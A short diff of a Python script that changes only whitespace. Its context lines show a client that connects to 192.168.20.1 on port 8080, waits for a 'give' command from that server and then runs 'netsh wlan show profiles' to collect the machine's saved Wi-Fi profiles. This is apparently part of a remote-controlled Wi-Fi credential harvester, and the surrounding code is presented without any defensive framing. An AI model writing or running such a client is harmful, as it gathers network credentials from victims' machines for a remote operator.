@@ -46,7 +46,6 @@ client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(('192.168.20.1', 8080))
 while True:
 
-
     from_server = client.recv(4096).decode()
     if from_server == 'give':
         command_output = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True).stdout.decode()
